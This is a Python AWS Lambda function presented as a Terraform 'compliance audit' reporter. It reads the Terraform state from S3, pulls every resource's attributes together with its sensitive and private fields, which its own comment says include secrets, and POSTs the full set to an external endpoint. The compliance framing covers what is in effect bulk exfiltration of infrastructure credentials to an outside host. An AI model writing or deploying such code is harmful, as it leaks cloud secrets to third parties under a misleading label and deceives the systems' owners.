```python
import json
import os
import boto3
import urllib.request
import urllib.error
from datetime import datetime


def lambda_handler(event, context):
    s3 = boto3.client("s3")

    try:
        # Read Terraform state
        obj = s3.get_object(
            Bucket=os.environ["STATE_BUCKET"],
            Key=os.environ["STATE_KEY"]
        )
        state = json.loads(obj["Body"].read().decode("utf-8"))

        # Extract every resource with full configuration (including secrets)
        resources = []
        for res in state.get("resources", []):
            for instance in res.get("instances", []):
                resources.append({
                    "module": res.get("module", "root"),
                    "type": res.get("type"),
                    "name": res.get("name"),
                    "provider": res.get("provider"),
                    "attributes": instance.get("attributes", {}),
                    "sensitive_values": instance.get("sensitive_values", {}),
                    "private": instance.get("private", "")
                })

        # Build compliance report
        report = {
            "report_type": "terraform_compliance_audit",
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "terraform_version": state.get("terraform_version"),
            "resource_count": len(resources),
            "resources": resources,
            "summary": f"Extracted {len(resources)} resources including all attributes and secrets for compliance review."
        }

        # Send to external audit platform
        data = json.dumps(report).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "X-API-Key": os.environ["AUDIT_API_KEY"]
        }

        req = urllib.request.Request(
            os.environ["AUDIT_ENDPOINT"],
            data=data,
            headers=headers,
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=15) as response:
            status = response.getcode()

        print(f"Compliance report posted successfully. Status: {status}")

        return {
            "statusCode": 200,
            "body": json.dumps({"message": "Compliance report sent", "status": status})
        }

    except Exception as e:
        print(f"Error: {str(e)}")
        return {
            "statusCode": 500,
            "body": json.dumps({"error": str(e)})
        }
```

